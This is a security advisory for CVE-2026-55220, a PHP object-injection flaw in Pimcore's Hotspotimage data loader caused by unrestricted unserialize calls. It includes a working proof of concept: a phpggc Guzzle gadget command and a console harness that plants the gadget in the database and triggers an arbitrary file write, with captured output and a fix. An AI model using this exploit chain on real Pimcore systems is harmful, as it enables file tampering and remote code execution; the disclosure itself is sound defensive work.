# [C] Pimcore Hotspotimage getDataFromResource() unrestricted Serialize::unserialize over object-store column (PHP Object Injection, CWE-502)

## Summary
Severity: Critical
Advisory: GHSA-w23p-wrp7-ch38
CVE: CVE-2026-55220
CWE: CWE-502
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-08-28
Source: https://github.com/advisories/GHSA-w23p-wrp7-ch38
Type: github-advisory

## Affected
- Packagist: `pimcore/pimcore` — affected >=2026.1.0 <2026.1.6
- Packagist: `pimcore/pimcore` — affected >=0 <12.3.10

## Details
## Summary

`Pimcore\Model\DataObject\ClassDefinition\Data\Hotspotimage::getDataFromResource()` deserializes the `*__hotspots` object-store column through the `Pimcore\Tool\Serialize::unserialize()` wrapper **without a class allowlist** (the wrapper's `$allowedClasses` parameter defaults to `true`, i.e. fully unrestricted). Because the persistence layer always stores this column as PHP-`serialize()`d bytes, every load of a DataObject that has a Hotspotimage (advanced image) field runs an unrestricted `unserialize()` over the stored column value. An attacker who can write the `*__hotspots` store column with crafted serialized bytes achieves PHP Object Injection (CWE-502): arbitrary classes are instantiated and their magic methods (`__wakeup`/`__destruct`) execute, which is exploitable for remote code execution via gadget chains present in Pimcore's own bundled dependencies (e.g. `guzzlehttp/guzzle`).

The same field-data family also affects the sibling marshallers `ImageGallery`, `Block`, and `Video`, which use the identical `json_decode(...) ?: Serialize::unserialize(...)` fallback over their respective store columns. The root cause is shared: `Serialize::unserialize()` defaults to an unrestricted class list, and these callers pass no second argument.

## Severity

High. Successful exploitation yields PHP Object Injection leading to remote code execution (proven below as arbitrary file write using a gadget from Pimcore's bundled `guzzlehttp/guzzle 7.11.0`). This is the deserialization leg of an attack: it requires the ability to write the `*__hotspots` object-store column with attacker-chosen serialized bytes. No class-allowlist defense is present, so any such write is directly weaponizable on the next object load. CVSS-wise this is comparable to other deserialization sinks over attacker-influenceable storage in this codebase.

## Affected component

- File: `models/DataObject/ClassDefinition/Data/Hotspotimage.php`, method `getDataFromResource()`.
- Vulnerable lines (v2026.1.4 / v12.3.8):
  ```php
  $metaData = $data[$this->getName() . '__hotspots'];
  // check if the data is JSON (backward compatibility)
  $md = json_decode($metaData, true);
  if (!$md) {
      $md = Serialize::unserialize($metaData);   // unrestricted: allowed_classes defaults to true
  } elseif (is_array($md)) {
      $md['hotspots'] = $md;
  }
  ```
- Root enabler: `lib/Tool/Serialize.php`
  ```php
  public static function unserialize(?string $data = null, array|bool $allowedClasses = true): mixed
  {
      if ($data === null || $data === '') { return $data; }
      return unserialize($data, ['allowed_classes' => $allowedClasses]);  // default true = unrestricted
  }
  ```
- Sibling marshallers with the identical fallback shape: `ImageGallery`, `Block`, `Video` (DataObject\ClassDefinition\Data).
- Package: `pimcore/pimcore` (Composer).
- Affected versions: all currently maintained releases, including the latest `v2026.1.4` and `v12.3.8` (verified against deployed `v2026.1.4`).

## Data flow

1. On save, `Hotspotimage::getDataForResource()` stores the hotspot/marker/crop metadata as `Serialize::serialize($metaData)` into the `<field>__hotspots` object-store column — i.e. PHP serialized bytes, not JSON.
2. On load, `Hotspotimage::getDataFromResource()` reads that column, calls `json_decode()` (which fails for the serialized format), and therefore falls through to `Serialize::unserialize($metaData)` with the default unrestricted class list.
3. `Serialize::unserialize()` invokes `unserialize($data, ['allowed_classes' => true])`, instantiating any class named in the bytes and triggering its magic methods.
4. The load path is exercised on essentially every object retrieval (admin grid/detail, frontend rendering, Studio/API reads, inheritance walks) for objects whose class declares a Hotspotimage field, with a non-null `<field>__image`.

The attacker primitive is the ability to place crafted serialized bytes into the `<field>__hotspots` store column (for example through an SQL-write/store-write primitive). The defect is that the deserialization is performed with no class allowlist, so any such write is directly executable.

## Proof of Concept

Verified end-to-end against a real, locally deployed Pimcore `v2026.1.4` (Composer skeleton + MariaDB + `pimcore:install`), not a ported stub. The gadget is `phpggc Guzzle/FW1` built against Pimcore's own bundled `guzzlehttp/guzzle 7.11.0`; its `GuzzleHttp\Cookie\FileCookieJar::__destruct` writes an attacker-controlled file to disk (a file-write primitive; the same surface reaches RCE via other vendored gadget chains).

Gadget generation (476→474 raw bytes, non-JSON so the `unserialize` fallback is taken):
```
printf 'PWNED_BY_DESERIALIZATION_%s' "$(date +%s)" > /tmp/ggc_local_src.txt
./phpggc Guzzle/FW1 /tmp/pimcore_pwned_hotspot.txt /tmp/ggc_local_src.txt | tr -d '\n' > /tmp/ggc_guzzle_fw1.ser
# stored bytes begin: O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{...
```

Reproduction harness (a Symfony console command living in the deployed app; it creates a real DataObject class with a Hotspotimage field, a real image asset, a real saved object, performs the attacker store-write into `object_store_<id>.img__hotspots`, then reloads the object through the real Pimcore model layer):
```php
<?php
declare(strict_types=1);
namespace App\Command;

use Pimcore\Db;
use Pimcore\Model\Asset;
use Pimcore\Model\DataObject;
use Pimcore\Model\DataObject\ClassDefinition;
use Symfony\Component\Console\Attribute\AsCommand;
use Symfony\Component\Console\Command\Command;
use Symfony\Component\Console\Input\InputInterface;
use Symfony\Component\Console\Input\InputOption;
use Symfony\Component\Console\Output\OutputInterface;

#[AsCommand(name: 'e2e:hotspot', description: 'E2E CWE-502 Hotspotimage __hotspots unserialize')]
final class E2eHotspotCommand extends Command
{
    protected function configure(): void
    {
        $this->addOption('benign', null, InputOption::VALUE_NONE, 'negative control: benign JSON');
        $this->addOption('restricted', null, InputOption::VALUE_NONE, 'negative control: allowed_classes=false');
    }

    protected function execute(InputInterface $input, OutputInterface $output): int
    {
        $o = fn (string $m) => $output->writeln($m);
        $gadget = (string) file_get_contents('/tmp/ggc_guzzle_fw1.ser');
        $target = '/tmp/pimcore_pwned_hotspot.txt';
        @unlink($target);

        $o('=== STEP 1: create DataObject class with a Hotspotimage field ===');
        $class = ClassDefinition::getByName('E2eHotspot');
        if (!$class) {
            $class = new ClassDefinition();
            $class->setName('E2eHotspot');
            $class->setGroup('e2e');
            $field = new ClassDefinition\Data\Hotspotimage();
            $field->setName('img');
            $field->setTitle('img');
            $panel = new ClassDefinition\Layout\Panel();
            $panel->setName('Layout');
            $panel->addChild($field);
            $class->setLayoutDefinitions($panel);
            $class->save();
        }
        $o('  class id=' . $class->getId());

        $o('=== STEP 2: create image asset (Hotspotimage needs a valid __image id) ===');
        $png = base64_decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==');
        $asset = Asset::getByPath('/e2e_pixel.png');
        if (!$asset) {
            $asset = new Asset\Image();
            $asset->setFilename('e2e_pixel.png');
            $asset->setParent(Asset::getById(1));
            $asset->setData($png);
            $asset->save();
        }
        $o('  asset id=' . $asset->getId());

        $o('=== STEP 3: create+save object carrying that image ===');
        $obj = DataObject::getByPath('/e2e_obj');
        if (!$obj) {
            $fqcn = '\\Pimcore\\Model\\DataObject\\' . $class->getName();
            $obj = new $fqcn();
            $obj->setKey('e2e_obj');
            $obj->setParent(DataObject::getById(1));
            $obj->setPublished(true);
            $obj->setValue('img', new DataObject\Data\Hotspotimage($asset));
            $obj->save();
        }
        $objId = $obj->getId();
        $store = 'object_store_' . $class->getId();
        $o('  object id=' . $objId . '  store=' . $store);

        $o('=== STEP 4: ATTACKER STORAGE-WRITE into img__hotspots column ===');
        $db = Db::get();
        $payload = $input->getOption('benign')
            ? json_encode(['hotspots' => [], 'marker' => [], 'crop' => []])
            : $gadget;
        $db->executeStatement('UPDATE `' . $store . '` SET `img__hotspots` = ? WHERE oo_id = ?', [$payload, $objId]);
        $stored = (string) $db->fetchOne('SELECT `img__hotspots` FROM `' . $store . '` WHERE oo_id = ?', [$objId]);
        $o('  stored prefix: ' . substr($stored, 0, 60));
        $o('  json_decode(stored) === null ? ' . var_export(json_decode($stored, true) === null, true) . '  (=> unserialize fallback)');

        $o('=== STEP 5: clear cache + reload object => getDataFromResource() ===');
        \Pimcore\Cache::clearAll();
        \Pimcore\Cache\RuntimeCache::clear();
        $o('  target file before load exists? ' . var_export(file_exists($target), true));

        if ($input->getOption('restricted')) {
            $o('  [negative control] fixed wrapper allowed_classes=false on the same bytes');
            $res = @unserialize($stored, ['allowed_classes' => false]);
            $o('  returned type=' . gettype($res) . ' class=' . (is_object($res) ? get_class($res) : 'n/a'));
            gc_collect_cycles();
        } else {
            try {
                $reloaded = DataObject\Concrete::getById($objId, ['force' => true]);
                $reloaded->getImg(); // triggers Hotspotimage::getDataFromResource() lazy load
                $o('  reloaded class=' . get_class($reloaded));
                unset($reloaded);
            } catch (\Throwable $e) {
                $o('  (post-unserialize downstream error, gadget already instantiated): ' . $e->getMessage());
            }
            gc_collect_cycles();
        }

        $o('=== RESULT ===');
        clearstatcache();
        if (file_exists($target)) {
            $o('  [VULNERABLE] gadget file WRITTEN: ' . $target);
            $o('  contents: ' . trim((string) file_get_contents($target)));
        } else {
            $o('  [NOT TRIGGERED] target file absent');
        }
        return Command::SUCCESS;
    }
}
```

Captured output — RUN A (positive, gadget):
```
=== STEP 1: create DataObject class with a Hotspotimage field ===
  class id=1
=== STEP 2: create image asset (Hotspotimage needs a valid __image id) ===
  asset id=2
=== STEP 3: create+save object carrying that image ===
  object id=4  store=object_store_1
=== STEP 4: ATTACKER STORAGE-WRITE into img__hotspots column ===
  stored prefix: O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:36:"\GuzzleHttp\
  json_decode(stored) === null ? true  (=> unserialize fallback)
=== STEP 5: clear cache + reload object => getDataFromResource() ===
  target file before load exists? false
  (post-unserialize downstream error, gadget already instantiated): Cannot use object of type GuzzleHttp\Cookie\FileCookieJar as array
=== RESULT ===
  [VULNERABLE] gadget file WRITTEN: /tmp/pimcore_pwned_hotspot.txt
  contents: [{"Expires":1,"Discard":false,"Value":"PWNED_BY_DESERIALIZATION_1780420803"}]
```

Captured output — RUN B (negative control, benign JSON in the column):
```
=== STEP 4: ATTACKER STORAGE-WRITE into img__hotspots column ===
  [negative control] storing benign JSON
  stored prefix: {"hotspots":[],"marker":[],"crop":[]}
  json_decode(stored) === null ? false  (=> unserialize fallback)
=== STEP 5: clear cache + reload object => getDataFromResource() ===
  target file before load exists? false
  reloaded class=Pimcore\Model\DataObject\E2eHotspot
=== RESULT ===
  [NOT TRIGGERED] target file absent
```

Captured output — RUN C (negative control, the fix: allowed_classes=false over the same gadget bytes):
```
=== STEP 4: ATTACKER STORAGE-WRITE into img__hotspots column ===
  stored prefix: O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:36:"\GuzzleHttp\
  json_decode(stored) === null ? true  (=> unserialize fallback)
=== STEP 5: clear cache + reload object => getDataFromResource() ===
  target file before load exists? false
  [negative control] fixed wrapper allowed_classes=false on the same bytes
  returned type=object class=__PHP_Incomplete_Class
=== RESULT ===
  [NOT TRIGGERED] target file absent
```

RUN A shows the attacker bytes drive `unserialize()` to instantiate the `GuzzleHttp\Cookie\FileCookieJar` gadget, whose destructor writes an attacker-controlled file. RUN B shows benign JSON takes the safe `json_decode` branch (no deserialization, no file). RUN C shows that performing the same deserialization with an `allowed_classes` allowlist returns an inert `__PHP_Incomplete_Class` and the gadget never runs — i.e. the proposed fix neutralizes the attack.

## Impact

PHP Object Injection (CWE-502) on object load. With gadget chains available in Pimcore's bundled dependencies this is exploitable for remote code execution; the PoC demonstrates an attacker-controlled arbitrary file write via the bundled `guzzlehttp/guzzle 7.11.0` `FileCookieJar` chain. Because the `*__hotspots` column is read on virtually every load of an affected object (admin UI, frontend output, API, inheritance resolution), any write of crafted bytes into that column is reliably executed.

## Remediation

Make `Serialize::unserialize()` safe by default and/or pass an explicit class allowlist at the Hotspotimage/ImageGallery/Block/Video callers.

Preferred minimal fix at the wrapper (closes the whole `Serialize::unserialize()`-without-allowlist family in one place):
```php
public static function unserialize(?string $data = null, array|bool $allowedClasses = false): mixed
```
(i.e. flip the default to `false`, requiring callers that legitimately need to revive objects to opt in with an explicit allowlist). Alternatively, change each affected marshaller to pass `['allowed_classes' => false]` (or a tight allowlist such as `[MarkerHotspotItem::class]`) explicitly. RUN C above confirms `allowed_classes` deserialization renders the gadget inert. Fix PR (private temporary advisory fork): https://github.com/pimcore/pimcore-ghsa-w23p-wrp7-ch38/pull/1

## References
- https://github.com/pimcore/pimcore/security/advisories/GHSA-w23p-wrp7-ch38
- https://github.com/pimcore/pimcore/pull/19181
- https://github.com/pimcore/pimcore/commit/b184c01bf11e213e601d965b4e96c8bb7248e980
- https://github.com/pimcore/pimcore
- https://github.com/pimcore/pimcore/releases/tag/v12.3.10
- https://github.com/pimcore/pimcore/releases/tag/v2026.1.6
